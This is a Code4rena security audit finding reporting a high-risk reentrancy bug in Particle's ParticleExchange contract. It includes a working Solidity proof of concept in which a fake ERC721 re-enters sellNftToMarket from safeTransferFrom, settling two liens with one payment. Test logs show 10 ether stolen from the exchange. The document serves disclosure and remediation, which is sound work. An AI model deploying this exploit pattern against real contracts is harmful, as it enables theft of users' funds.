## Tags

- bug
- 3 (High Risk)
- satisfactory
- selected for report
- sponsor confirmed
- H-04

# [_execSellNftToMarket() re-enter steal funds](https://github.com/code-423n4/2023-05-particle-findings/issues/14) 

# Lines of code

https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L291


# Vulnerability details

## Impact
re-enter steal funds

## Proof of Concept
`_execSellNftToMarket()` The number of changes in the balance to represent whether the corresponding amount has been received

```solidity
    function _execSellNftToMarket(
        address collection,
        uint256 tokenId,
        uint256 amount,
        bool pushBased,
        address marketplace,
        bytes calldata tradeData
    ) internal {
...

        if (
            IERC721(collection).ownerOf(tokenId) == address(this) ||
            address(this).balance - ethBefore - wethBefore != amount
        ) {
            revert Errors.InvalidNFTSell();
        }    
```

Since the current contract doesn't have any `nonReentrant` restrictions
Then the user can use reentrant and pay only once when multiple `_execSellNftToMarket()`s share the same transfer of funds

Here are some examples.
1. alice supplies a fake NFT_A 
2. alice executes sellNftToMarket(), assuming sellAmount=10
3. execSellNftToMarket() inside the `IERC721(collection).safeTransferFrom()` for re-entry.
Note: The collection is an arbitrary contract, so `safeTransferFrom()` can be any code.
4. Reenter the execution of another Lien's sellNftToMarket(), and really transfer to amount=10
5. After the above re-entry, go back to step 3, this step does not need to actually pay, because step 4 has been transferred to sellAmount = 10, so it can pass this verification `address(this).balance - ethBefore - wethBefore ! = amount`

so that only one payment is made, reaching the `sellNftToMarket()` twice


Test code:

add to ParticleExchange.t.sol

```solidity

    function testReenter() public{
        vm.deal(address(particleExchange),100 ether);        
        FakeERC721 fakeERC721 =  new FakeERC721(particleExchange,address(dummyMarketplace),"fake","fake");
        vm.deal(address(fakeERC721),10 ether);
        fakeERC721.execSteal();
    }



contract FakeERC721 is ERC721 {
    ParticleExchange private particleExchange;
    address private marketplace;
    uint sellAmount = 10 ether;
    constructor(ParticleExchange _particleExchange,address _marketplace, string memory name, string memory symbol) ERC721(name, symbol) {
        particleExchange = _particleExchange;
        marketplace = _marketplace;
    }

    function mint(address to, uint256 tokenId) external {
        _safeMint(to, tokenId);
    }

    function execSteal() external {
        //0. mint nft and supply lien
        uint256 tokenId = 1;
        _mint(address(this), tokenId);
        _mint(address(this), tokenId + 1);
        _setApprovalForAll(address(this),address(particleExchange), true);
        //console.log(isApprovedForAll(address(this),address(particleExchange)));
        uint256 lienId = particleExchange.supplyNft(address(this), tokenId, sellAmount, 0);
        uint256 lienId2 = particleExchange.supplyNft(address(this), tokenId + 1, sellAmount, 0);
        uint256 particleExchangeBefore = address(particleExchange).balance;
        uint256 fakeNftBefore = address(this).balance;
        console.log("before particleExchange balance:",particleExchangeBefore / 1 ether);
        console.log("before fakeNft balance:",fakeNftBefore / 1 ether);
        //1.sell , reenter pay one but sell two lien
        sell(lienId,tokenId,sellAmount); 
        //2. repay lien 1 get 10 ether funds
        particleExchange.repayWithNft(
            Lien({
                lender: address(this),
                borrower: address(this),
                collection: address(this),
                tokenId: tokenId,
                price: sellAmount,
                rate: 0,
                loanStartTime: block.timestamp,
                credit: 0,
                auctionStartTime: 0
            }),
            lienId,
            tokenId
        );
        //3. repay lien 2 get 10 ether funds
        particleExchange.repayWithNft(
            Lien({
                lender: address(this),
                borrower: address(this),
                collection: address(this),
                tokenId: tokenId + 1,
                price: sellAmount,
                rate: 0,
                loanStartTime: block.timestamp,
                credit: 0,
                auctionStartTime: 0
            }),            
            lienId2,
            tokenId + 1
        );       
        //4.show fakeNft steal funds
        console.log("after particleExchange balance:",address(particleExchange).balance/ 1 ether);
        console.log("after fakeNft balance:",address(this).balance/ 1 ether);
        console.log("after particleExchange lost:",(particleExchangeBefore - address(particleExchange).balance)/ 1 ether);       
        console.log("after fakeNft steal:",(address(this).balance - fakeNftBefore) / 1 ether);        
    }

    function sell(uint256 lienId,uint256 tokenId,uint256 sellAmount) private{
        bytes memory tradeData = abi.encodeWithSignature(
            "sellToMarket(address,address,uint256,uint256)",
            address(particleExchange),
            address(this),
            tokenId,
            sellAmount
        );
        particleExchange.sellNftToMarket(
            Lien({
                lender: address(this),
                borrower: address(0),
                collection: address(this),
                tokenId: tokenId,
                price: sellAmount,
                rate: 0,
                loanStartTime: 0,
                credit: 0,
                auctionStartTime: 0
            }),
            lienId,
            sellAmount,
            true,
            marketplace,
            tradeData
        );         
    }        
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory data
    ) public virtual override {
        if(from == address(particleExchange)){
            if (tokenId == 1) { //tokenId =1 , reenter , don't pay
                sell(1,tokenId + 1 ,sellAmount);
            }else { // tokenId = 2 ,real pay
                payable(address(particleExchange)).transfer(sellAmount);
            }
        }
        _transfer(_ownerOf(tokenId),to,tokenId); //anyone can transfer
    }
    fallback() external payable {}
}
```


```console
$ forge test --match testReenter  -vvv

Running 1 test for test/ParticleExchange.t.sol:ParticleExchangeTest
[PASS] testReenter() (gas: 1869563)
Logs:
  before particleExchange balance: 100
  before fakeNft balance: 10
  after particleExchange balance: 90
  after fakeNft balance: 20
  after particleExchange lost: 10
  after fakeNft steal: 10
```
Test result: ok. 1 passed; 0 failed; finished in 4.80ms

## Tools Used

## Recommended Mitigation Steps

Add `nonReentrant` restrictions to all Lien-related methods


## Assessed type

Reentrancy